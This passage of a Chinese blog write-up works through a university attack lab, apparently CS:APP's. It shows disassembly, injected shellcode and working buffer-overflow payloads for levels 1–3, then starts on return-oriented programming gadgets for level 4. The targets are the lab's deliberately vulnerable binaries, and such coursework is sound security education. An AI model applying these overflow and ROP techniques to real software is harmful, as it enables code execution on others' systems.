class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对应的汇编内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:	48 83 ec 28          	sub    $0x28,%rsp</span><br><span class="line">  4017ac:	48 89 e7             	mov    %rsp,%rdi</span><br><span class="line">  4017af:	e8 8c 02 00 00       	call   401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  4017b9:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">  4017bd:	c3                   	ret    </span><br><span class="line">  4017be:	90                   	nop</span><br><span class="line">  4017bf:	90                   	nop</span><br><span class="line">  </span><br><span class="line">  0000000000401968 &lt;test&gt;:</span><br><span class="line">  401968:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  40196c:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401971:	e8 32 fe ff ff       	call   4017a8 &lt;getbuf&gt;         # push IP ; jmp getbuf</span><br><span class="line">  401976:	89 c2                	mov    %eax,%edx</span><br><span class="line">  401978:	be 88 31 40 00       	mov    $0x403188,%esi</span><br><span class="line">  40197d:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  401982:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401987:	e8 64 f4 ff ff       	call   400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  40198c:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  401990:	c3                   	ret    </span><br><span class="line">  401991:	90                   	nop</span><br><span class="line">  </span><br><span class="line">  00000000004017c0 &lt;touch1&gt;:</span><br><span class="line">  4017c0:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  4017cb:	00 00 00 </span><br><span class="line">  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi</span><br><span class="line">  4017d3:	e8 e8 f4 ff ff       	call   400cc0 &lt;puts@plt&gt;</span><br><span class="line">  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  4017dd:	e8 ab 04 00 00       	call   401c8d &lt;validate&gt;</span><br><span class="line">  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">  4017e7:	e8 54 f6 ff ff       	call   400e40 &lt;exit@plt&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们只要确定存放返回地址的位置，将其覆盖成4017c0即可。可以看到调用getbuf之后，sub    $0x28,%rsp，创建了0x28字节的缓冲区域，返回地址位于栈底，第一个字符距离栈底28个字节，我们只要输入一串长度为32字节的字符，前二十八个任意填充，后四个按照小端序填充touch1的地址c0 17 40 00即可。</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">c0</span> <span class="number">17</span> <span class="number">40</span> <span class="number">00</span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230824122941.png"></p>
<p>正确的姿势是将16进制数据写入flag1.txt然后使用题目中给出的16进制转字符串工具&gt;flag01.txt,然后将flag01.txt作为参数传入。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./hex2raw &lt; flag1.txt  &gt; input1.txt</span><br></pre></td></tr></table></figure>

<p>注意这里的&lt; 和 &gt;不是括号，而是指向，将flag1.txt传入hex，其输出结果写入input1.txt</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./ctarget -q -i flag01.txt</span><br></pre></td></tr></table></figure>

<ul>
<li>-q选项是不连接网络 （不加此选项会报错）</li>
<li>-i 是 以文件作为输入</li>
</ul>
<h4 id="Level2："><a href="#Level2：" class="headerlink" title="Level2："></a>Level2：</h4><p>test调用getbuf，并返回touch2，和level1的不同在于touch2需要参数，函数的第一个参数是存放在rdi寄存器中的。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="title function_">getbuf</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[BUFFER_SIZE];</span><br><span class="line">    Gets(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No exploit.Getbuf returned 0x%x\n&quot;</span>,val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">touch2</span><span class="params">(<span class="type">unsigned</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">    vlevel=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (val==cookie)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Touch2!:You called touche2(0x%.8x)&quot;</span>,val);</span><br><span class="line">        validate(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Misfire:You called touch2(0x%.8x)\n&quot;</span>,val);</span><br><span class="line">        fail(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对应的汇编内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:	48 83 ec 28          	sub    $0x28,%rsp</span><br><span class="line">  4017ac:	48 89 e7             	mov    %rsp,%rdi</span><br><span class="line">  4017af:	e8 8c 02 00 00       	call   401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  4017b9:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">  4017bd:	c3                   	ret    </span><br><span class="line">  4017be:	90                   	nop</span><br><span class="line">  4017bf:	90                   	nop</span><br><span class="line">  </span><br><span class="line">  0000000000401968 &lt;test&gt;:</span><br><span class="line">  401968:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  40196c:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401971:	e8 32 fe ff ff       	call   4017a8 &lt;getbuf&gt;         # push IP ; jmp getbuf</span><br><span class="line">  401976:	89 c2                	mov    %eax,%edx</span><br><span class="line">  401978:	be 88 31 40 00       	mov    $0x403188,%esi</span><br><span class="line">  40197d:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  401982:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401987:	e8 64 f4 ff ff       	call   400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  40198c:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  401990:	c3                   	ret    </span><br><span class="line">  401991:	90                   	nop</span><br><span class="line">  </span><br><span class="line">  00000000004017ec &lt;touch2&gt;:</span><br><span class="line">  4017ec:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  4017f0:	89 fa                	mov    %edi,%edx</span><br><span class="line">  4017f2:	c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc &lt;vlevel&gt; vlevel=2;</span><br><span class="line">  4017f9:	00 00 00 </span><br><span class="line">  4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi        # 6044e4 &lt;cookie&gt;   if(val==cookie)</span><br><span class="line">  401802:	75 20                	jne    401824 &lt;touch2+0x38&gt;</span><br><span class="line">  401804:	be e8 30 40 00       	mov    $0x4030e8,%esi</span><br><span class="line">  401809:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  40180e:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401813:	e8 d8 f5 ff ff       	call   400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401818:	bf 02 00 00 00       	mov    $0x2,%edi</span><br><span class="line">  40181d:	e8 6b 04 00 00       	call   401c8d &lt;validate&gt;</span><br><span class="line">  401822:	eb 1e                	jmp    401842 &lt;touch2+0x56&gt;</span><br><span class="line">  401824:	be 10 31 40 00       	mov    $0x403110,%esi</span><br><span class="line">  401829:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  40182e:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401833:	e8 b8 f5 ff ff       	call   400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401838:	bf 02 00 00 00       	mov    $0x2,%edi</span><br><span class="line">  40183d:	e8 0d 05 00 00       	call   401d4f &lt;fail&gt;</span><br><span class="line">  401842:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">  401847:	e8 f4 f5 ff ff       	call   400e40 &lt;exit@plt&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>首先还是在保存返回地址的地方填充touch2的地址，接下来的难点在于如何将cookie填充到rdi中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmp    0x202ce2(%rip),%edi    # if(val==cookie)</span><br></pre></td></tr></table></figure>

<p>cookie的值储存在相对rip偏移0x202ce2的位置。<strong>思路：</strong> 仍然填充44个字节，最后四个字节填充我们编写的shellcode的地址，通过执行shellcode，rdi填充了cookie，并将touch2的地址pop进了栈，最后ret回到touch2。ret指令相当于pop ip，我们64位机器使用retq。</p>
<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230824222556.png"></p>
<p>使用gdb进行调试，<code>b getbuf</code> 将断点设在getbuf函数，查看栈的地址，减去0x28之后，栈顶的地址是0x5561dc78。这是我们填充的数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov 0x59b997fa,%edi</span><br><span class="line">push touch2_address</span><br><span class="line">retq</span><br><span class="line">xxxxxxxxxxx</span><br><span class="line">xxxxxxxxxxx</span><br><span class="line">return_address</span><br></pre></td></tr></table></figure>

<p>有一点要注意，栈是从高地址向低地址增长，而代码是从低地址往高地址执行所以填充之后栈空间应该是这样<img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230824231507.png">接下来是得到相应的字节码，首先用gcc进行汇编操作得到.o后缀的目标文件，然后用odjdump进行反汇编即可。<img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230824232603.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0:	bf fa 97 b9 59       	mov    $0x59b997fa,%edi</span><br><span class="line">5:	68 ec 17 40 00       	push   $0x4017ec</span><br><span class="line">c:	c3                   	ret    </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bf fa 97 b9 59 68 ec 17</span><br><span class="line">40 00 c3 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230824234910.png"></p>
<p>成功，中间犯了一个小错误，将<code>push $0x4017ec</code>写成了<code>push   0x4017ec</code>,其中前者代表的是立即数，后者则代表的内存地址处的值。</p>
<h4 id="Level3："><a href="#Level3：" class="headerlink" title="Level3："></a>Level3：</h4><p>还是test调用完getbuf之后不返回test，而是执行touch3，touch3需要接收参数cookie，touch3中还调用了hexmatch函数，要传递两个参数。</p>
<p><strong>思路：</strong> 不能直接ret到touch3中，应该像上一个挑战一样，先跳转到我们的shellcode，shellcode完成参数的传递以及ret到touch3。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="title function_">getbuf</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[BUFFER_SIZE];</span><br><span class="line">    Gets(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No exploit.Getbuf returned 0x%x\n&quot;</span>,val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">hexmatch</span><span class="params">(<span class="type">unsigned</span> val,<span class="type">char</span> *sval)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">  <span class="type">char</span>* s=cbuf+random()%<span class="number">100</span>;</span><br><span class="line">  <span class="built_in">sprintf</span>(s,<span class="string">&quot;%.8x&quot;</span>,val);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval,s,<span class="number">9</span>)==<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">touch3</span><span class="params">(<span class="type">char</span>* sval)</span></span><br><span class="line">&#123;</span><br><span class="line">    vlevel=<span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span>(hexmatch(cookie,sval))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Touch3!:You called touch3(\&quot;%s\&quot;)\n,sval&quot;</span>);</span><br><span class="line">        calidate(<span class="number">3</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Misfire:You called touch3(\&quot;%s\&quot;)\n,sval&quot;</span>);</span><br><span class="line">        fail(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>汇编代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:	48 83 ec 28          	sub    $0x28,%rsp</span><br><span class="line">  4017ac:	48 89 e7             	mov    %rsp,%rdi</span><br><span class="line">  4017af:	e8 8c 02 00 00       	call   401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  4017b9:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">  4017bd:	c3                   	ret    </span><br><span class="line">  4017be:	90                   	nop</span><br><span class="line">  4017bf:	90                   	nop</span><br><span class="line">  </span><br><span class="line">  0000000000401968 &lt;test&gt;:</span><br><span class="line">  401968:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  40196c:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401971:	e8 32 fe ff ff       	call   4017a8 &lt;getbuf&gt;         # push IP ; jmp getbuf</span><br><span class="line">  401976:	89 c2                	mov    %eax,%edx</span><br><span class="line">  401978:	be 88 31 40 00       	mov    $0x403188,%esi</span><br><span class="line">  40197d:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  401982:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401987:	e8 64 f4 ff ff       	call   400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  40198c:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  401990:	c3                   	ret    </span><br><span class="line">  401991:	90                   	nop</span><br><span class="line">  </span><br><span class="line">  000000000040184c &lt;hexmatch&gt;:</span><br><span class="line">  40184c:	41 54                	push   %r12</span><br><span class="line">  40184e:	55                   	push   %rbp</span><br><span class="line">  40184f:	53                   	push   %rbx</span><br><span class="line">  401850:	48 83 c4 80          	add    $0xffffffffffffff80,%rsp    #-128</span><br><span class="line">  401854:	41 89 fc             	mov    %edi,%r12d</span><br><span class="line">  401857:	48 89 f5             	mov    %rsi,%rbp</span><br><span class="line">  40185a:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax</span><br><span class="line">  401861:	00 00 </span><br><span class="line">  401863:	48 89 44 24 78       	mov    %rax,0x78(%rsp)</span><br><span class="line">  401868:	31 c0                	xor    %eax,%eax</span><br><span class="line">  40186a:	e8 41 f5 ff ff       	call   400db0 &lt;random@plt&gt;</span><br><span class="line">  40186f:	48 89 c1             	mov    %rax,%rcx</span><br><span class="line">  401872:	48 ba 0b d7 a3 70 3d 	movabs $0xa3d70a3d70a3d70b,%rdx</span><br><span class="line">  401879:	0a d7 a3 </span><br><span class="line">  40187c:	48 f7 ea             	imul   %rdx</span><br><span class="line">  40187f:	48 01 ca             	add    %rcx,%rdx</span><br><span class="line">  401882:	48 c1 fa 06          	sar    $0x6,%rdx</span><br><span class="line">  401886:	48 89 c8             	mov    %rcx,%rax</span><br><span class="line">  401889:	48 c1 f8 3f          	sar    $0x3f,%rax</span><br><span class="line">  40188d:	48 29 c2             	sub    %rax,%rdx</span><br><span class="line">  401890:	48 8d 04 92          	lea    (%rdx,%rdx,4),%rax</span><br><span class="line">  401894:	48 8d 04 80          	lea    (%rax,%rax,4),%rax</span><br><span class="line">  401898:	48 c1 e0 02          	shl    $0x2,%rax</span><br><span class="line">  40189c:	48 29 c1             	sub    %rax,%rcx</span><br><span class="line">  40189f:	48 8d 1c 0c          	lea    (%rsp,%rcx,1),%rbx</span><br><span class="line">  4018a3:	45 89 e0             	mov    %r12d,%r8d</span><br><span class="line">  4018a6:	b9 e2 30 40 00       	mov    $0x4030e2,%ecx</span><br><span class="line">  4018ab:	48 c7 c2 ff ff ff ff 	mov    $0xffffffffffffffff,%rdx</span><br><span class="line">  4018b2:	be 01 00 00 00       	mov    $0x1,%esi</span><br><span class="line">  4018b7:	48 89 df             	mov    %rbx,%rdi</span><br><span class="line">  4018ba:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  4018bf:	e8 ac f5 ff ff       	call   400e70 &lt;__sprintf_chk@plt&gt;</span><br><span class="line">  4018c4:	ba 09 00 00 00       	mov    $0x9,%edx</span><br><span class="line">  4018c9:	48 89 de             	mov    %rbx,%rsi</span><br><span class="line">  4018cc:	48 89 ef             	mov    %rbp,%rdi</span><br><span class="line">  4018cf:	e8 cc f3 ff ff       	call   400ca0 &lt;strncmp@plt&gt;</span><br><span class="line">  4018d4:	85 c0                	test   %eax,%eax</span><br><span class="line">  4018d6:	0f 94 c0             	sete   %al</span><br><span class="line">  4018d9:	0f b6 c0             	movzbl %al,%eax</span><br><span class="line">  4018dc:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi</span><br><span class="line">  4018e1:	64 48 33 34 25 28 00 	xor    %fs:0x28,%rsi</span><br><span class="line">  4018e8:	00 00 </span><br><span class="line">  4018ea:	74 05                	je     4018f1 &lt;hexmatch+0xa5&gt;</span><br><span class="line">  4018ec:	e8 ef f3 ff ff       	call   400ce0 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">  4018f1:	48 83 ec 80          	sub    $0xffffffffffffff80,%rsp</span><br><span class="line">  4018f5:	5b                   	pop    %rbx</span><br><span class="line">  4018f6:	5d                   	pop    %rbp</span><br><span class="line">  4018f7:	41 5c                	pop    %r12</span><br><span class="line">  4018f9:	c3                   	ret    </span><br><span class="line"></span><br><span class="line">00000000004018fa &lt;touch3&gt;:</span><br><span class="line">  4018fa:	53                   	push   %rbx</span><br><span class="line">  4018fb:	48 89 fb             	mov    %rdi,%rbx        #将rdi里的参数复制到rbx</span><br><span class="line">  4018fe:	c7 05 d4 2b 20 00 03 	movl   $0x3,0x202bd4(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  401905:	00 00 00 </span><br><span class="line">  401908:	48 89 fe             	mov    %rdi,%rsi  #参数sval</span><br><span class="line">  40190b:	8b 3d d3 2b 20 00    	mov    0x202bd3(%rip),%edi        # 6044e4 &lt;cookie&gt;</span><br><span class="line">  401911:	e8 36 ff ff ff       	call   40184c &lt;hexmatch&gt;</span><br><span class="line">  401916:	85 c0                	test   %eax,%eax</span><br><span class="line">  401918:	74 23                	je     40193d &lt;touch3+0x43&gt;</span><br><span class="line">  40191a:	48 89 da             	mov    %rbx,%rdx</span><br><span class="line">  40191d:	be 38 31 40 00       	mov    $0x403138,%esi</span><br><span class="line">  401922:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  401927:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  40192c:	e8 bf f4 ff ff       	call   400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401931:	bf 03 00 00 00       	mov    $0x3,%edi</span><br><span class="line">  401936:	e8 52 03 00 00       	call   401c8d &lt;validate&gt;</span><br><span class="line">  40193b:	eb 21                	jmp    40195e &lt;touch3+0x64&gt;</span><br><span class="line">  40193d:	48 89 da             	mov    %rbx,%rdx</span><br><span class="line">  401940:	be 60 31 40 00       	mov    $0x403160,%esi</span><br><span class="line">  401945:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  40194a:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  40194f:	e8 9c f4 ff ff       	call   400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401954:	bf 03 00 00 00       	mov    $0x3,%edi</span><br><span class="line">  401959:	e8 f1 03 00 00       	call   401d4f &lt;fail&gt;</span><br><span class="line">  40195e:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">  401963:	e8 d8 f4 ff ff       	call   400e40 &lt;exit@plt&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>首先调用touch3之前，要确保rdi中有指针，注意参数类型是char*而上一个挑战 <code>void touch2(unsigned val)</code>参数是一个无符号整型，所以这一次我们还要创建一个字符串被rdi中的指针所指。字符串是“59b997fa”，我们将字符串的ascii输入。</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">db <span class="string">&quot;59b997fa&quot;</span><span class="punctuation">,</span><span class="number">0</span></span><br><span class="line">mov <span class="variable">%sval_address</span> <span class="punctuation">,</span><span class="variable">%rdi</span></span><br><span class="line">push <span class="variable">%touch3_address</span></span><br><span class="line"><span class="keyword">ret</span></span><br></pre></td></tr></table></figure>

<p>字符串是以**’\0’**结尾的，其ascii是0，检测到0计算机就是到字符串结束了。我们只要将字符串的首地址放入寄存器rdi即可。题目描述中还提到<img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825132143.png"></p>
<p>可以看到在调用了hexmatch之后，连续push了三次<img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825132422.png"></p>
<p>所以临近返回地址的地方不要存放数据。<img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825133258.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0:	48 c7 c7 78 dc 61 55 	mov    $0x5561dc78,%rdi</span><br><span class="line">7:	68 fa 18 40 00       	push   $0x4018fa</span><br><span class="line">c:	c3                   	ret    </span><br></pre></td></tr></table></figure>

<p>所以：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">35 39 62 39 39 37 66 61 </span><br><span class="line">00 48 c7 c7 78 dc 61 55</span><br><span class="line">68 fa 18 40 00 c3 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">81 dc 61 55</span><br></pre></td></tr></table></figure>

<p>注意，最后的四字节的地址不再是栈顶的位置，因为我们的字符串是存放在栈顶的，ret到栈顶程序不会向下执行，我们要ret到mov指令的地址。81&#x3D;78+9</p>
<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825135929.png"></p>
<p>失败了，猜测应该还是被hexmatch和strcmp压入的数据覆盖了，参考了一下，原来还可以将字符串放置在第44个字节后面，即test的栈帧中，因为我们不在返回test所以覆盖那里也没什么影响。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi</span><br><span class="line">7:	68 fa 18 40 00       	push   $0x4018fa</span><br><span class="line">c:	c3                   	ret  </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55 68</span><br><span class="line">fa 18 40 00 c3 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure>

<p>注意不能直接跟在44字节后面，因为64位机器ret指令相当于pop八个字节，pop之后rsp+8，所以字符串要在返回地址八个字节之后.0x5561dca8&#x3D;0x5561dc78+0x2c（48字节）。</p>
<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825141847.png"></p>
<p>成功！！！</p>
<h3 id="实验部分2面向返回的编程："><a href="#实验部分2面向返回的编程：" class="headerlink" title="实验部分2面向返回的编程："></a>实验部分2面向返回的编程：</h3><p>这一部分难度增加，上一部分挑战栈既没有<strong>随机化</strong>也没有<strong>不可执行的内存标记</strong>。栈空间被标记为不可执行区域，所以我们不再能使用注入的shellcode。接下来的挑战要用到ROP ( Return-oriented Programming )即面向返回的编程。</p>
<p><strong>ROP原理：</strong>		 </p>
<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825205403.png"></p>
<p>我们注入的内容被划分为一个个gadget，其实是一个个地址，gatcode有一个显著的特点，即最后一字节内容为c3即ret的机器码，这样一个个gatget就有ret指令连接了起来。既然栈内空间不可执行，那么这个地址要指向哪里呢？答案是程序现有的代码段，举例来说<img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825210000.png"></p>
<p>这是一个函数，看起来没什么特别，也没有什么攻击性，但是转化为它的机器级表示<img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825210117.png"></p>
<p>其中 <code>48 89 c7</code>是 <code>mov %rax,rdi</code>的机器码，我们只要在返回地址处填充0x400f18(起始地址400f15往后三个字节)即可执行<code>mov %rax,rdi</code>并且由ret弹出栈内的下一个地址继续操作。PDF给出了几张供我们参考攻击的表<img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825210817.png">                </p>
<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825210825.png"></p>
<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825210838.png"></p>
<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825210846.png"></p>
<p>好，接下来开搞。！！！</p>
<h4 id="Level4："><a href="#Level4：" class="headerlink" title="Level4："></a>Level4：</h4><p>这个挑战和2要达到相同的目的，即test在调用完getbuf之后返回执行touch2，执行touch2之前要往%rdi中传递参数cookie。在level2中我们直接在栈中注入了<code>mov cookie，%rdi</code> 的机器码，这次挑战我们只能利用现有的代码执行。</p>
<p>分为两步，cookie在我们注入的字符串中，要通过pop指令将cookie弹到rdi中，对应的机器码是 <code>5f</code>，可惜的是在给出的gadget中并没有5f，所以我们只能先将cookie弹到一个寄存器，再将这个寄存器的值复制到%rdi中</p>
<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825212912.png"></p>
<p><code>48 89 c7</code>对应 <code>mov %rax,%rdi</code>,地址是0x4019a2</p>
<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825213149.png"></p>
<p><code>58 90 c3</code> 对应 <code>popq %rax  ; nop ; ret</code> 。地址0x4019ab。接下来就该考虑注入的顺序了。</p>
<p>touch2的地址：0x4017ec。cookie的值0x59b997fa</p>
<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825214129.png"></p>
